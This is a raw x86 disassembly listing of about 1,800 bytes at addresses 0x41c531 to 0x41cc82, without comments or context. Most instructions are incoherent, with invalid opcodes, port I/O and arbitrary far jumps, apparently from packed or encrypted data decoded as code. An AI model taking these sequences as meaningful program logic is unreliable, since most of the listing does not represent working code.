  41c531:	cwde   
  41c532:	add    eax,0xf8485caa
  41c537:	test   al,0x45
  41c539:	dec    esi
  41c53a:	fsubr  st,st(3)
  41c53c:	add    ebp,edi
  41c53e:	arpl   si,cx
  41c540:	retf   0xc1db
  41c543:	mov    ah,0x84
  41c545:	mov    al,0x45
  41c547:	mov    edx,0x1c66e3ad
  41c54c:	push   edx
  41c54d:	jo     0x41c5b4
  41c54f:	repnz cmp ebp,DWORD PTR [ebp+0x5f695a9e]
  41c556:	mov    edi,0xf68039f4
  41c55b:	arpl   WORD PTR [eax],si
  41c55d:	fdiv   QWORD PTR [esi+0x1c864347]
  41c563:	inc    ebx
  41c564:	shr    BYTE PTR [edx+0x35405571],0x75
  41c56b:	add    DWORD PTR [esi],esp
  41c56d:	sub    DWORD PTR [ecx+0x78371d16],ebp
  41c573:	inc    ebp
  41c574:	mov    BYTE PTR [edx-0x77],cl
  41c577:	clc    
  41c578:	push   0xb1788249
  41c57d:	xor    eax,0xc1a5372d
  41c582:	shr    DWORD PTR [ecx+edi*4],cl
  41c585:	out    dx,eax
  41c586:	pop    edi
  41c587:	jmp    0x48ea:0x3f74ae3b
  41c58e:	retf   0xd1a0
  41c591:	pop    ecx
  41c592:	mov    dl,0x9a
  41c594:	test   eax,0xea093f16
  41c599:	xlat   BYTE PTR ds:[ebx]
  41c59a:	sbb    al,0x26
  41c59c:	rcl    BYTE PTR [edx-0x2c],0x4
  41c5a0:	sbb    DWORD PTR ds:0x82ef73b7,ebp
  41c5a6:	and    DWORD PTR [edi-0x4e],edi
  41c5a9:	aaa    
  41c5aa:	das    
  41c5ab:	mov    ch,0x13
  41c5ad:	jnp    0x41c581
  41c5af:	jo     0x41c595
  41c5b1:	xor    cl,BYTE PTR [ebp+0x29da5e90]
  41c5b7:	mov    dh,0x55
  41c5b9:	imul   DWORD PTR [ebp+0x3e6afa35]
  41c5bf:	adc    ax,0x3f23
  41c5c3:	popf   
  41c5c4:	cmp    BYTE PTR [esi+0x34],0x1c
  41c5c8:	imul   ebx,DWORD PTR [edx-0x5e],0x9f49e747
  41c5cf:	xchg   ecx,eax
  41c5d0:	in     al,0xcf
  41c5d2:	or     DWORD PTR [esi],esi
  41c5d4:	ins    BYTE PTR es:[edi],dx
  41c5d5:	sbb    eax,0x209e0f34
  41c5da:	into   
  41c5db:	xor    ah,dl
  41c5dd:	fs (bad) 
  41c5df:	fcomp  DWORD PTR ds:0x26f77305
  41c5e5:	into   
  41c5e6:	stos   DWORD PTR es:[edi],eax
  41c5e7:	sbb    al,0xbb
  41c5e9:	pop    ebx
  41c5ea:	add    eax,0xbb3e59a4
  41c5ef:	rcr    BYTE PTR [esi+0x8],cl
  41c5f2:	and    eax,0x5c066c54
  41c5f7:	imul   ecx,DWORD PTR [ecx],0xd637a764
  41c5fd:	scas   eax,DWORD PTR es:[edi]
  41c5fe:	push   cs
  41c5ff:	xchg   ebp,eax
  41c600:	loop   0x41c609
  41c602:	mov    dl,BYTE PTR [esi-0x13f4863a]
  41c608:	or     ebp,ebx
  41c60a:	adc    al,BYTE PTR [edx+0x5c181976]
  41c610:	cwde   
  41c611:	inc    ebp
  41c612:	sub    BYTE PTR [ebp+edx*1+0x20989c9b],dl
  41c619:	mov    ds,WORD PTR ds:0x877fda80
  41c61f:	leave  
  41c620:	fisubr WORD PTR [eax]
  41c622:	(bad)  
  41c623:	or     al,0x5f
  41c625:	ret    0x64ac
  41c628:	(bad)  
  41c62a:	xchg   edx,eax
  41c62b:	inc    edi
  41c62c:	cmp    ebp,DWORD PTR [eax-0x1421c7fc]
  41c632:	es (bad) 
  41c634:	das    
  41c635:	jo     0x41c5d7
  41c637:	dec    esp
  41c638:	cmc    
  41c639:	loop   0x41c5de
  41c63b:	aas    
  41c63c:	jnp    0x41c5c9
  41c63e:	xlat   BYTE PTR ds:[ebx]
  41c63f:	xchg   ebx,eax
  41c640:	mov    al,0x3
  41c642:	hlt    
  41c643:	jmp    0xce5ecbe8
  41c648:	scas   eax,DWORD PTR es:[edi]
  41c649:	push   eax
  41c64a:	aad    0xd7
  41c64c:	leave  
  41c64d:	cmp    BYTE PTR [esi+ebx*2-0x70bf9a46],ah
  41c654:	push   esp
  41c655:	repnz and DWORD PTR [bx+di],eax
  41c659:	jo     0x41c61b
  41c65b:	popf   
  41c65c:	xor    BYTE PTR [esi],dh
  41c65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c65f:	pop    ebx
  41c660:	pop    ebp
  41c661:	nop
  41c662:	es aas 
  41c664:	js     0x41c61a
  41c666:	jns    0x41c5ec
  41c668:	pop    edx
  41c669:	dec    eax
  41c66a:	sub    eax,0xfb1ecd75
  41c66f:	(bad)  
  41c670:	xchg   edx,eax
  41c671:	test   BYTE PTR [edx],ch
  41c673:	mov    dl,BYTE PTR [edx-0xa7b931f]
  41c679:	push   edx
  41c67a:	in     eax,dx
  41c67b:	xchg   esp,eax
  41c67c:	hlt    
  41c67d:	jge    0x41c686
  41c67f:	and    eax,0xa229714e
  41c684:	imul   ecx,DWORD PTR [ecx-0x67],0x33
  41c688:	fisttp DWORD PTR [ebp+0x1803f045]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x199c773e,eax
  41c6cc:	inc    esi
  41c6cd:	inc    esp
  41c6ce:	add    cl,dh
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c745
  41c6d7:	ins    DWORD PTR es:[edi],dx
  41c6d8:	xor    eax,0x737a36e7
  41c6dd:	add    cl,bl
  41c6df:	repnz (bad) 
  41c6e2:	fldenv [ecx-0x40]
  41c6e5:	fnsave [eax-0x71]
  41c6e8:	xchg   edi,eax
  41c6e9:	adc    ebx,eax
  41c6eb:	mov    ebx,DWORD PTR [edx-0xc2757b]
  41c6f1:	pop    esp
  41c6f2:	xchg   esp,eax
  41c6f3:	enter  0xcc86,0xbb
  41c6f7:	pop    esp
  41c6f8:	pop    esi
  41c6f9:	mov    al,ss:0xf3f3f608
  41c6ff:	imul   ebx,ebp,0x17
  41c702:	dec    esi
  41c703:	stos   BYTE PTR es:[edi],al
  41c704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c705:	push   0x996de94d
  41c70a:	pop    edx
  41c70b:	arpl   bx,ax
  41c70d:	jg     0x41c6e1
  41c70f:	xlat   BYTE PTR ds:[ebx]
  41c710:	enter  0x5b7b,0x23
  41c714:	lds    ebx,FWORD PTR [ebp-0x27b553f8]
  41c71a:	mov    ebx,0xde0d6888
  41c71f:	adc    DWORD PTR [ebx-0x31],0xffffff9b
  41c723:	mov    BYTE PTR ds:0x93c2b412,ch
  41c729:	inc    edi
  41c72a:	pop    eax
  41c72b:	mov    cs,WORD PTR [ebp+0x5957e9d6]
  41c731:	stc    
  41c732:	sbb    ah,BYTE PTR [ebx]
  41c734:	mov    al,ds:0x1c29418c
  41c739:	cmp    DWORD PTR [esi-0x4c11f65c],ebp
  41c73f:	out    0x5c,al
  41c741:	mov    ebx,0xe7065f58
  41c746:	daa    
  41c747:	(bad)  [eax]
  41c749:	mov    ds:0x4164d0e4,eax
  41c74e:	mov    esp,0x4941f41
  41c753:	lods   al,BYTE PTR ds:[si]
  41c755:	sub    al,0x57
  41c757:	sbb    ebx,ecx
  41c759:	not    ebx
  41c75b:	(bad)  
  41c75d:	in     eax,0x7d
  41c75f:	out    0xca,ax
  41c762:	bound  ebx,QWORD PTR [ecx+0x6a]
  41c765:	cwde   
  41c766:	dec    ebp
  41c767:	or     al,0xc3
  41c769:	ret    
  41c76a:	and    edx,DWORD PTR [ecx-0x2f]
  41c76d:	div    BYTE PTR [esi-0x10]
  41c770:	pop    ecx
  41c771:	sbb    ah,BYTE PTR [edi]
  41c773:	iret   
  41c774:	xor    BYTE PTR [ecx],0x21
  41c777:	rcr    ecx,1
  41c779:	(bad)  
  41c77a:	jns    0x41c790
  41c77c:	mov    ecx,DWORD PTR [ebp-0xc0619ff]
  41c782:	dec    edx
  41c783:	or     eax,esi
  41c785:	addr16 jno 0x41c71e
  41c788:	out    0xc8,al
  41c78a:	rcl    esp,1
  41c78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c78d:	pop    ebx
  41c78e:	inc    eax
  41c78f:	xlat   BYTE PTR ds:[ebx]
  41c790:	rcr    BYTE PTR [ecx],cl
  41c792:	out    dx,al
  41c793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c794:	xchg   edx,eax
  41c795:	aam    0x33
  41c797:	jbe    0x41c7be
  41c799:	jns    0x41c71d
  41c79b:	adc    al,0x16
  41c79d:	xchg   ecx,eax
  41c79e:	test   al,0x15
  41c7a0:	sub    edx,DWORD PTR [ebp+0x76]
  41c7a3:	aam    0xdc
  41c7a5:	cmp    BYTE PTR [edx],al
  41c7a7:	pop    edx
  41c7a8:	cmp    DWORD PTR [ecx+0x1f],ebp
  41c7ab:	or     al,ch
  41c7ad:	repnz cmp ah,dl
  41c7b0:	outs   dx,BYTE PTR ds:[esi]
  41c7b1:	push   edx
  41c7b2:	in     al,dx
  41c7b3:	cs cmp eax,0x7323b342
  41c7b9:	pop    ebp
  41c7ba:	mov    ds:0x5c44fd84,eax
  41c7bf:	retf   0xa062
  41c7c2:	rcl    DWORD PTR [edx-0x63],0xb4
  41c7c6:	sub    BYTE PTR [edx+0x347c9085],dh
  41c7cc:	lock inc esi
  41c7ce:	ret    0x5155
  41c7d1:	jecxz  0x41c7bb
  41c7d3:	pop    edi
  41c7d4:	stos   DWORD PTR es:[edi],eax
  41c7d5:	inc    ebx
  41c7d6:	dec    esp
  41c7d7:	aas    
  41c7d8:	xchg   DWORD PTR [ecx],ebx
  41c7da:	into   
  41c7db:	inc    eax
  41c7dc:	fcmove st,st(4)
  41c7de:	pusha  
  41c7df:	push   ss
  41c7e0:	push   edi
  41c7e1:	enter  0x136d,0x49
  41c7e5:	retf   
  41c7e6:	das    
  41c7e7:	add    al,dh
  41c7e9:	mov    ds:0x8fe26cef,eax
  41c7ee:	lock mov eax,0xeb3b0661
  41c7f4:	retf   0x94f
  41c7f7:	adc    DWORD PTR [esi],ebx
  41c7f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7fa:	mov    cl,0xf
  41c7fc:	arpl   WORD PTR [ecx-0x64],ax
  41c7ff:	mov    edi,0x9f2ed681
  41c804:	adc    ecx,DWORD PTR [esi+0x1ba2d5d1]
  41c80a:	bound  ecx,QWORD PTR [ebx+0x5d68465]
  41c810:	dec    ebx
  41c811:	push   ebp
  41c812:	pop    esp
  41c813:	mov    ecx,0xc880d790
  41c818:	add    BYTE PTR [ebx-0x3f],al
  41c81b:	xchg   ecx,eax
  41c81c:	or     edx,edx
  41c81e:	inc    ecx
  41c81f:	mov    WORD PTR [edi-0x6e],ss
  41c822:	jp     0x41c88f
  41c824:	pop    edi
  41c825:	jb     0x41c7ef
  41c827:	scas   al,BYTE PTR es:[edi]
  41c828:	repz sbb DWORD PTR [ecx-0x61],esp
  41c82c:	cmp    eax,0x7d354ce0
  41c831:	out    0xd3,eax
  41c833:	pop    ss
  41c834:	jns    0x41c7c6
  41c836:	and    ah,bh
  41c838:	pop    ss
  41c839:	hlt    
  41c83a:	add    esp,DWORD PTR [edi+0x4fd00f43]
  41c840:	jle    0x41c824
  41c842:	add    eax,0x417588a2
  41c847:	mov    ebx,0x42b30652
  41c84c:	jmp    0x30cdc157
  41c851:	inc    eax
  41c852:	jb     0x41c85f
  41c854:	sub    al,0xbb
  41c856:	dec    edi
  41c857:	repnz fsubr DWORD PTR [esi+0x64cf6e22]
  41c85e:	rol    cl,cl
  41c860:	ds out 0x3b,eax
  41c863:	dec    ebx
  41c864:	jns    0x41c832
  41c866:	inc    ebx
  41c867:	fidiv  DWORD PTR [eax-0x3572574c]
  41c86d:	mov    ebp,0xd4673123
  41c872:	lock dec ebp
  41c874:	cmp    esp,DWORD PTR ds:0xc376f4f7
  41c87a:	push   ecx
  41c87b:	push   esp
  41c87c:	pop    esp
  41c87d:	cmp    dl,BYTE PTR ds:0xb2d98337
  41c883:	or     al,0xe7
  41c885:	cmp    bl,BYTE PTR [esi-0x7d7d7dca]
  41c88b:	lock std 
  41c88d:	xor    eax,0x6ebf3874
  41c892:	sbb    dh,BYTE PTR [ecx]
  41c894:	inc    edi
  41c895:	push   0xfffffff7
  41c897:	test   dh,0xa3
  41c89a:	scas   eax,DWORD PTR es:[edi]
  41c89b:	push   0xffffffab
  41c89d:	xlat   BYTE PTR ds:[ebx]
  41c89e:	inc    edi
  41c89f:	imul   ebp,DWORD PTR [edi+esi*1],0x30
  41c8a3:	in     al,0x3b
  41c8a5:	fist   DWORD PTR [edi+0x70]
  41c8a8:	cmp    esi,ebx
  41c8aa:	jg     0x41c8cd
  41c8ac:	xor    DWORD PTR [ebp+0x6db82e04],0xffffffe8
  41c8b3:	pop    edi
  41c8b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8b5:	cmp    al,0x7f
  41c8b7:	mov    esp,0x98de29c9
  41c8bc:	popa   
  41c8bd:	add    BYTE PTR [edx-0x18fe3cbe],0x5e
  41c8c4:	dec    edi
  41c8c5:	repnz cmp ecx,ebx
  41c8c8:	inc    esi
  41c8c9:	out    dx,al
  41c8ca:	and    esp,DWORD PTR cs:[edx-0x5ec8e112]
  41c8d1:	push   ecx
  41c8d2:	pop    ss
  41c8d3:	xchg   esi,eax
  41c8d4:	xchg   ecx,eax
  41c8d5:	setb   BYTE PTR [edi]
  41c8d8:	test   eax,0x2ff1030a
  41c8dd:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8df:	loop   0x41c8f8
  41c8e1:	dec    edx
  41c8e2:	dec    dl
  41c8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e5:	and    DWORD PTR [eax+edi*4-0x7b84d807],esi
  41c8ec:	dec    esp
  41c8ed:	inc    esp
  41c8ee:	dec    edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	push   ebp
  41c910:	imul   ebp,DWORD PTR [ebp+0x7ff7183c],0x78
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c909
  41c91c:	outs   dx,DWORD PTR ds:[esi]
  41c91d:	push   ebp
  41c91e:	jg     0x41c91f
  41c920:	sbb    BYTE PTR [edx-0x42f0f00e],dl
  41c926:	mov    bh,0xed
  41c928:	stos   BYTE PTR es:[edi],al
  41c929:	xchg   ecx,eax
  41c92a:	pop    eax
  41c92b:	in     eax,dx
  41c92c:	icebp  
  41c92d:	push   cs
  41c92e:	pop    ss
  41c92f:	dec    edi
  41c930:	jno    0x41c91b
  41c932:	pop    ebp
  41c933:	call   0x3dcd:0x8889afff
  41c93a:	scas   eax,DWORD PTR es:[edi]
  41c93b:	pop    es
  41c93c:	inc    esp
  41c93d:	cmp    esi,DWORD PTR [ecx]
  41c93f:	xchg   ebx,eax
  41c940:	jns    0x41c906
  41c942:	xchg   edi,eax
  41c943:	add    DWORD PTR [edx+0x6ca63e9c],esp
  41c949:	jnp    0x41c8ff
  41c94b:	ror    DWORD PTR [ebx+0x201113cc],0xe7
  41c952:	cmp    BYTE PTR [ebx+ebx*2-0x17],0x8b
  41c957:	popw   ds
  41c959:	test   eax,0x172e1ec
  41c95e:	rcr    DWORD PTR [edi],1
  41c960:	inc    eax
  41c961:	jbe    0x41c8f5
  41c963:	mov    eax,ds:0x134881bc
  41c968:	adc    BYTE PTR [esi],bl
  41c96a:	enter  0xeadd,0xf9
  41c96e:	(bad)  
  41c96f:	sub    al,BYTE PTR [edx]
  41c971:	or     edi,eax
  41c973:	dec    esi
  41c974:	ss in  eax,dx
  41c976:	es dec edi
  41c978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c979:	mov    cl,0x70
  41c97b:	push   ss
  41c97c:	cdq    
  41c97d:	aas    
  41c97e:	test   al,0xf6
  41c980:	mov    cl,0xfa
  41c982:	mov    ds:0x79e89008,eax
  41c987:	call   0x16b9:0x3ea02018
  41c98e:	int    0x26
  41c990:	les    ecx,FWORD PTR [edi+0x5aa5e80f]
  41c996:	sub    BYTE PTR [ebx],ch
  41c998:	push   ebp
  41c999:	xor    eax,0x45c3c27f
  41c99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c99f:	push   ebp
  41c9a0:	in     eax,dx
  41c9a1:	scas   eax,DWORD PTR es:[edi]
  41c9a2:	sub    eax,0xd0ee7386
  41c9a7:	repnz (bad) 
  41c9a9:	xor    esi,edi
  41c9ab:	xchg   ebp,eax
  41c9ac:	enter  0x2cda,0x92
  41c9b0:	jle    0x41c9af
  41c9b2:	cmc    
  41c9b3:	pop    ss
  41c9b4:	pop    edx
  41c9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b6:	rcl    DWORD PTR [esi+0x1166e284],1
  41c9bc:	leave  
  41c9bd:	inc    edi
  41c9be:	addr16 push esi
  41c9c0:	pop    ecx
  41c9c1:	fidiv  WORD PTR [edi+edi*8+0x45]
  41c9c5:	adc    al,0x54
  41c9c7:	sahf   
  41c9c8:	push   edx
  41c9c9:	mov    eax,ds:0x9f3c932a
  41c9ce:	cmp    esp,DWORD PTR [ebx-0x47292518]
  41c9d4:	sti    
  41c9d5:	test   BYTE PTR ds:0x4c979bd5,dl
  41c9db:	hlt    
  41c9dc:	inc    eax
  41c9dd:	ret    0xb7e8
  41c9e0:	dec    esi
  41c9e1:	sub    ch,dh
  41c9e3:	pop    edx
  41c9e4:	adc    BYTE PTR [ecx+0x32],bh
  41c9e7:	sub    dh,dh
  41c9e9:	sub    ebx,edi
  41c9eb:	repz cwde 
  41c9ed:	push   ss
  41c9ee:	repz je 0x41ca18
  41c9f1:	mov    ebx,0x65b8c4fe
  41c9f6:	test   eax,esp
  41c9f8:	mov    esp,0x80a55024
  41c9fd:	jmp    0xabeb:0xac691999
  41ca04:	enter  0xaa1d,0xb7
  41ca08:	cmp    ah,dl
  41ca0a:	add    DWORD PTR [ecx],esp
  41ca0c:	imul   ebx,DWORD PTR [ecx-0x61],0x16
  41ca10:	ret    0x62a4
  41ca13:	push   0x3bf8ca4a
  41ca18:	div    DWORD PTR [edx+0x29]
  41ca1b:	hlt    
  41ca1c:	imul   ecx,DWORD PTR [ecx],0x79d3f410
  41ca22:	popa   
  41ca23:	and    dl,ah
  41ca25:	outs   dx,BYTE PTR ds:[esi]
  41ca26:	pop    ebx
  41ca27:	add    ebp,edx
  41ca29:	fnclex 
  41ca2b:	and    BYTE PTR [esp+ecx*8],dl
  41ca2e:	and    esi,DWORD PTR [esi+0x2ca522dd]
  41ca34:	push   eax
  41ca35:	bound  esp,QWORD PTR [ebx+eax*4]
  41ca38:	pop    esi
  41ca39:	test   DWORD PTR [esi-0x35582207],0x8bc78b57
  41ca43:	pop    ecx
  41ca44:	jb     0x41ca85
  41ca46:	popa   
  41ca47:	xor    cl,BYTE PTR ds:0x85e53943
  41ca4d:	cmc    
  41ca4e:	mov    BYTE PTR [edx+0x33345efd],bh
  41ca54:	mov    ebx,0x464123d8
  41ca59:	push   esp
  41ca5a:	mov    dl,0xdf
  41ca5c:	(bad)  
  41ca5d:	popa   
  41ca5e:	or     ax,0x2df0
  41ca62:	xchg   edi,eax
  41ca63:	jae    0x41ca26
  41ca65:	push   edx
  41ca66:	add    cl,bh
  41ca68:	repz sahf 
  41ca6a:	lock test DWORD PTR ds:0xd89868d5,0x7e177aab
  41ca75:	pop    eax
  41ca76:	adc    BYTE PTR [ebx-0x41df3458],ch
  41ca7c:	sub    eax,DWORD PTR [ebp+0x6bb1b37b]
  41ca82:	mov    bl,0x26
  41ca84:	stos   BYTE PTR es:[edi],al
  41ca85:	pop    ebx
  41ca86:	mov    bh,0x42
  41ca88:	imul   DWORD PTR [eax]
  41ca8a:	loop   0x41ca39
  41ca8c:	aas    
  41ca8d:	add    eax,0xe0a725de
  41ca92:	add    ebx,ebx
  41ca94:	sbb    BYTE PTR [edi-0x5],ah
  41ca97:	xchg   edx,eax
  41ca98:	mov    dh,0x1
  41ca9a:	cmp    eax,0x562ca913
  41ca9f:	dec    edx
  41caa0:	mov    DWORD PTR [edi],edx
  41caa2:	xchg   edi,eax
  41caa3:	add    eax,0x84ed69bb
  41caa8:	aam    0x38
  41caaa:	fmul   DWORD PTR [ebx-0x63335783]
  41cab0:	fcomi  st,st(5)
  41cab2:	push   esp
  41cab3:	pop    es
  41cab4:	inc    esp
  41cab5:	xchg   BYTE PTR [ebp-0xdc56e],dl
  41cabb:	lahf   
  41cabc:	cmp    bh,BYTE PTR [edi]
  41cabe:	push   ds
  41cabf:	xor    BYTE PTR [ebx-0x1653bbbb],dh
  41cac5:	bound  esi,QWORD PTR [esi]
  41cac7:	pop    es
  41cac8:	xchg   ebx,eax
  41cac9:	(bad)  
  41caca:	mov    esp,0x2782813a
  41cacf:	cmc    
  41cad0:	aaa    
  41cad1:	(bad)  
  41cad2:	dec    esi
  41cad3:	mov    al,0x3c
  41cad5:	repz int3 
  41cad7:	test   eax,0x591341e
  41cadc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cadd:	lods   al,BYTE PTR ds:[esi]
  41cade:	mov    esi,0x7b61f275
  41cae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cae5:	sbb    dh,BYTE PTR [edi]
  41cae7:	shl    DWORD PTR gs:[eax-0x662f4679],0x17
  41caef:	enter  0xa9cf,0xcc
  41caf3:	jl     0x41cade
  41caf5:	mov    bl,0xd
  41caf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caf8:	xor    dh,BYTE PTR ds:0xd3a06b32
  41cafe:	adc    al,0xc7
  41cb00:	push   edi
  41cb01:	inc    ebp
  41cb02:	inc    eax
  41cb03:	popa   
  41cb04:	jge    0x41cabe
  41cb06:	cmc    
  41cb07:	out    0x20,al
  41cb09:	mov    bl,0x54
  41cb0b:	into   
  41cb0c:	scas   eax,DWORD PTR es:[edi]
  41cb0d:	pop    ebx
  41cb0e:	fdiv   DWORD PTR [eax-0x18b41cb3]
  41cb14:	mov    ds:0xde015cd7,eax
  41cb19:	xchg   ebp,eax
  41cb1a:	cdq    
  41cb1b:	test   eax,0x332152cc
  41cb20:	cmp    eax,0xfb707c7e
  41cb25:	xchg   edx,eax
  41cb26:	aad    0xd5
  41cb28:	push   edx
  41cb29:	mov    ds:0xcf513b5d,eax
  41cb2e:	pop    si
  41cb30:	mov    eax,ds:0xe95ee544
  41cb35:	xor    BYTE PTR [edx],al
  41cb37:	add    BYTE PTR [eax],al
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x7a476037
  41cb47:	scas   al,BYTE PTR es:[edi]
  41cb48:	dec    ecx
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cb12
  41cb52:	add    BYTE PTR [edi-0x16],0x11
  41cb56:	mov    bh,0x3e
  41cb58:	jle    0x41cb61
  41cb5a:	scas   eax,DWORD PTR es:[edi]
  41cb5b:	(bad)  
  41cb5c:	sar    BYTE PTR [esp+eax*4-0x6d5855c5],1
  41cb63:	xor    edi,DWORD PTR [ebp+eax*8+0x705fba81]
  41cb6a:	mov    ch,0x83
  41cb6c:	adc    BYTE PTR [edi-0x2c5268eb],ah
  41cb72:	in     al,0xb2
  41cb74:	(bad)  
  41cb75:	retf   0xf4e7
  41cb78:	test   al,ch
  41cb7a:	popf   
  41cb7b:	push   edx
  41cb7c:	mov    ah,0x84
  41cb7e:	in     al,dx
  41cb7f:	inc    ebp
  41cb80:	add    ch,BYTE PTR [ebx+0x2d]
  41cb83:	stos   BYTE PTR es:[edi],al
  41cb84:	pop    es
  41cb85:	sub    eax,0x1290c4db
  41cb8a:	pop    ebx
  41cb8b:	inc    ebx
  41cb8c:	cmp    al,0xc0
  41cb8e:	push   ss
  41cb8f:	sbb    DWORD PTR [edx],edx
  41cb91:	icebp  
  41cb92:	je     0x41cbcf
  41cb94:	mov    edi,0x8b0cd548
  41cb99:	aas    
  41cb9a:	xor    DWORD PTR [esi+0x31],0x15
  41cb9e:	mov    esi,0x4bb443a8
  41cba3:	test   al,0xa2
  41cba5:	scas   al,BYTE PTR es:[edi]
  41cba6:	icebp  
  41cba7:	in     eax,0x4e
  41cba9:	push   ecx
  41cbaa:	dec    edx
  41cbab:	mov    ebx,0xf1c48f85
  41cbb0:	jmp    0x3d1eacd
  41cbb5:	out    0xfc,eax
  41cbb7:	nop    esi
  41cbba:	scas   eax,DWORD PTR es:[edi]
  41cbbb:	ss jnp 0x41cb83
  41cbbe:	in     eax,dx
  41cbbf:	ds mov ch,0xa3
  41cbc2:	inc    ebp
  41cbc3:	in     eax,dx
  41cbc4:	and    eax,0xf0be7ecd
  41cbc9:	in     eax,dx
  41cbca:	ror    esp,1
  41cbcc:	cmp    DWORD PTR [eax+0x3c002893],ebx
  41cbd2:	mov    al,0xca
  41cbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbd5:	popa   
  41cbd6:	outs   dx,DWORD PTR ds:[esi]
  41cbd7:	push   es
  41cbd8:	xchg   edx,eax
  41cbd9:	addr16 xchg edi,eax
  41cbdb:	mov    ecx,DWORD PTR [eax+0x47]
  41cbde:	sub    eax,0x2c803650
  41cbe3:	xchg   edi,eax
  41cbe4:	in     al,dx
  41cbe5:	adc    DWORD PTR [ecx],ecx
  41cbe7:	fnstenv [ecx]
  41cbe9:	pop    edx
  41cbea:	push   es
  41cbeb:	xchg   edi,eax
  41cbec:	add    cl,BYTE PTR [edx]
  41cbee:	sahf   
  41cbef:	mov    DWORD PTR [eax+0x4f],ebx
  41cbf2:	mov    edx,DWORD PTR [ebp-0x1a]
  41cbf5:	fnsave [edx+0xe]
  41cbf8:	nop
  41cbf9:	jnp    0x41cc25
  41cbfb:	mov    ecx,0xb7629e35
  41cc00:	adc    ch,BYTE PTR [ebx+0x2a93a4c8]
  41cc06:	ins    DWORD PTR es:[edi],dx
  41cc07:	mov    al,0xd0
  41cc09:	inc    ebx
  41cc0a:	fcom   DWORD PTR [eax]
  41cc0c:	jmp    0x611b936c
  41cc11:	inc    esp
  41cc12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc13:	(bad)  
  41cc14:	(bad)  
  41cc15:	das    
  41cc16:	jnp    0x41cc16
  41cc18:	sub    ebp,DWORD PTR [eax+0x3d]
  41cc1b:	push   ds
  41cc1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc1d:	retf   0x8e7
  41cc20:	call   0xda17f3e9
  41cc25:	xor    DWORD PTR [esi],ebx
  41cc27:	dec    edi
  41cc28:	pop    ds
  41cc29:	push   edx
  41cc2a:	mov    dh,0x22
  41cc2c:	loop   0x41cbc8
  41cc2e:	and    eax,0xd68d0c17
  41cc33:	cmp    dl,dh
  41cc35:	jns    0x41cc68
  41cc37:	ins    DWORD PTR es:[edi],dx
  41cc38:	jmp    0x48bbefa0
  41cc3d:	mov    dh,0x87
  41cc3f:	and    ebp,DWORD PTR [esi-0x6e675937]
  41cc45:	int    0x39
  41cc47:	cmp    bl,cl
  41cc49:	aas    
  41cc4a:	in     al,0x60
  41cc4c:	jp     0x41cc19
  41cc4e:	sbb    eax,0xb6dadb4f
  41cc53:	loope  0x41cc9e
  41cc55:	jg     0x41cbf3
  41cc57:	push   ebp
  41cc58:	dec    BYTE PTR [edx-0x34305ad9]
  41cc5e:	inc    ebx
  41cc5f:	icebp  
  41cc60:	fwait
  41cc61:	hlt    
  41cc62:	adc    ebp,ebp
  41cc64:	push   eax
  41cc65:	imul   edx,DWORD PTR [edi+0x3f],0x45c0fcb2
  41cc6c:	data16 idiv BYTE PTR [ebx+0x3b751542]
  41cc73:	pop    eax
  41cc74:	adc    eax,0xb8db916a
  41cc79:	add    ebp,esp
  41cc7b:	mov    dh,0xeb
  41cc7d:	mov    edx,0xf5a9777c
  41cc82:	dec    eax
